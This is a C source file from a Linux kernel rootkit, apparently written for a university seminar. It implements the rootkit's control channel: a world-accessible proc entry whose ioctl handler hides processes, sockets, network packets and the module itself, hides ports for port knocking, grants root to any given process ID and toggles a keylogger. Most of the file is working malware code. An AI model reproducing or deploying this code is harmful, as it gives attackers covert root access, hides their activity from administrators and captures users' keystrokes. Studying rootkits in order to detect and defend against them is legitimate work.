/**
 * file ioctl_channel.c
 *
 * This file is part of the rootkit programmed for a seminar at TUM.
 *
 */

/* Our own ioctl numbers */
#include "chardev.h"
#include <linux/types.h>
#include <linux/cdev.h>

#include "hook.h"
#include <linux/delay.h>

/******* Defines *********/
#define BUF_LEN    1024

/******* Prototypes **************/
static ssize_t device_read(struct file *file,
		char __user *buffer, /* buffer to be filled with data */
		size_t length, /* length of the buffer */
		loff_t *offset);
static ssize_t device_write(struct file *file,
		const char *buffer,
		size_t length,
		loff_t *offset);
int open(struct inode *inode, struct file *filp);
int release(struct inode *inode, struct file *filp);
long own_ioctl(
		struct file *file,
		unsigned int ioctl_num,/* The number of the ioctl */
		unsigned long ioctl_param); /* The parameter to it */

static char msg[2*BUF_LEN];

static int accesses_ioctl = 0;
struct mutex lock_ioctl;

struct file_operations fops = {
		.owner = THIS_MODULE, // This is useful almost in any case
		.read = device_read,
		.write = device_write,
		.unlocked_ioctl = own_ioctl,
		.open           = open,
		.release        = release,
};

/**
 *
 * Init function for ioctl file.
 */
void initialize_ioctl_device(void)
{
	mutex_init(&lock_ioctl);
	proc_create_data(DEVICE_NAME,007,NULL,&fops,msg);
}

/**
 * Cleanup function for ioctl file.
 */

void remove_ioctl_device(void)
{
	remove_proc_entry(DEVICE_NAME, NULL);

	while(accesses_ioctl > 0){
		msleep(50);
	}
}



/**
 * Function is called when a process tries to
 * do an ioctl on our proc file {@value DEVICE_NAME}.
 * Notice that here the roles of read and write are reversed again, so in ioctl's read is to send information
 * to the kernel and write is to receive information from the kernel.
 *
 * @param file file descriptor of proc file
 * @param ioctl_num ioctl number
 * @param ioctl_param parameter, type long, can be used to pass anything (with cast)
 */
long own_ioctl(
		struct file *file,
		unsigned int ioctl_num,/* The number of the ioctl */
		unsigned long ioctl_param) /* The parameter to it */
{
	char *port, *protocol, *tmp, *ip, *pid_string;
	int port_int, protocol_int;
	unsigned int pid_ui;
	pid_t pid;
	int ret=0;


	switch(ioctl_num) {
	case IOCTL_SET_PID_TO_HIDE:
		kstrtoul((char *)ioctl_param, 10, (unsigned long)(&(pid)));
		//printk(KERN_INFO "%s\n", (char *)ioctl_param);
		add_pid_to_hide(pid);
		break;
	case IOCTL_RM_PID_FROM_HIDE:
		kstrtoul((char *)ioctl_param, 10, (unsigned long)(&(pid)));

		remove_pid_to_hide(pid);
		break;
	case IOCTL_HIDE_MODULE:
		if(strcmp("true", (const char *)ioctl_param) == 0){
			initialize_hiding_module();
		}
		else{
			remove_hiding_module();
		}
		break;
	case IOCTL_HIDE_SOCKET:
		port = (char *)ioctl_param;
		tmp = (char *)ioctl_param;
		while(*tmp != ':'){
			tmp++;
		}
		*tmp = '\0';
		tmp++;
		protocol = tmp;
		tmp = NULL;
		port_int = (int)simple_strtol(port, &tmp, 10);
		protocol_int = (int)simple_strtol(protocol, &tmp, 10);
		(void)add_socket_to_hide(protocol_int, port_int);
		break;
	case IOCTL_UNHIDE_SOCKET:
		port = (char *)ioctl_param;
		port_int = (int)simple_strtol(port, &tmp, 10);
		(void)remove_port_from_hiding(port_int);
		break;
	case IOCTL_HIDE_PACKETS_V4:
		ip = (char *)ioctl_param;
		packet_hide("ipv4",ip);
		break;
	case IOCTL_UNHIDE_PACKETS_V4:
		ip = (char *)ioctl_param;
		packet_unhide("ipv4", ip);
		break;
	case IOCTL_HIDE_PACKETS_V6:
		ip = (char *)ioctl_param;
		packet_hide("ipv6",ip);
		break;
	case IOCTL_UNHIDE_PACKETS_V6:
		ip = (char *)ioctl_param;
		packet_unhide("ipv6", ip);
		break;

	case IOCTL_ENABLE_PORT_KNOCKING:
		port = (char *)ioctl_param;
		port_int = (int)simple_strtol(port, &tmp, 10);
		//int *port_i = (int *)ioctl_param;
		port_hide(port_int);
		break;

	case IOCTL_DISABLE_PORT_KNOCKING:
		port = (char *)ioctl_param;
		port_int = (int)simple_strtol(port, &tmp, 10);						//TODO call port knocking function
		port_unhide(port_int);
		break;

	case IOCTL_PRIVILEGE_PROCESS:
		pid_string = (char *)ioctl_param;
		pid_ui = (unsigned int)simple_strtol(pid_string, &tmp, 10);
		give_root(pid_ui);
		break;
	case IOCTL_UNPRIVILEGE_PROCESS:
		pid_string = (char *)ioctl_param;
		pid_ui = (unsigned int)simple_strtol(pid_string, &tmp, 10);
		redo_root(pid_ui);
		break;
	case IOCTL_HIDE_CHILDREN_ON:
		turn_child_hiding_on();
		break;
	case IOCTL_HIDE_CHILDREN_OFF:
		turn_child_hiding_off();
		break;
	case IOCTL_UDP_LOG_ON:
		turn_keylogging_on();
                break;
	case IOCTL_UDP_LOG_OFF:
		turn_keylogging_off();
                break;
	default:
		break;

	}

	return ret;
}


int open(struct inode *inode, struct file *filp)
{
	inc_critical(&lock_ioctl, &accesses_ioctl);
	printk(KERN_INFO "Inside open \n");
	return 0;
}

int release(struct inode *inode, struct file *filp)
{
	printk (KERN_INFO "Inside close \n");
	dec_critical(&lock_ioctl, &accesses_ioctl);
	return 0;
}



/**
 * Get a message from a device. Return the amount of bytes read.
 */
static ssize_t device_read(struct file *file,
		char __user *buffer, /* buffer to be filled with data */
		size_t length, /* length of the buffer */
		loff_t *offset){ /* unknown */

	//   int count;

	// /* start from the offset */
	// int bytes_read = *offset;

	// /* make a temp string ready to fill the file content in it */
	// char temp_read[BUF_LEN + 8] = {'\0'};

	// /* Write the PID path and the inode number into the file */
	// for(count = 0; count < amount_hided; count++){
	// sprintf(&temp_read[strlen(temp_read)], "%s\n", proc_to_hide[count]);
	// }

	// /* check if already finished with reading */
	// if((int)*offset >= strlen(temp_read)){
	// return 0;
	// }

	// /* copy the file content into user space */
	// while(length && temp_read[bytes_read]){
	// put_user(temp_read[bytes_read],&buffer[bytes_read]);
	// bytes_read++;
	// length--;
	// }
	// *offset = *offset + bytes_read;
	return 0;
}


/**
 *
 *
 */
static ssize_t device_write(struct file *file,
		const char *buffer,
		size_t length,
		loff_t *offset){

	// int i;
	// int a;
	// /* We do not allow offst */
	// if(*offset>0){return -1;}
	// if(amount_hided >= amount_processes_to_hide){return -1;}

	// printk(KERN_INFO "Written to hide_process\n");

	// /* copy from user space to kernel space */
	// for(i = 0; i < length && i < BUF_LEN; i++){
	// get_user(proc_to_hide[amount_hided][i], buffer + i);
	// }
	// /* Make sure the string is null terminated */
	// if(i < BUF_LEN){proc_to_hide[amount_hided][i] = '\0';}

	// a = 0;
	// while(proc_to_hide[amount_hided][a]){
	// if(proc_to_hide[amount_hided][a] == '\n'){
	// proc_to_hide[amount_hided][a] = '\0';
	// break;
	// }
	// a++;
	// }

	//	amount_hided++;

	return length;
}
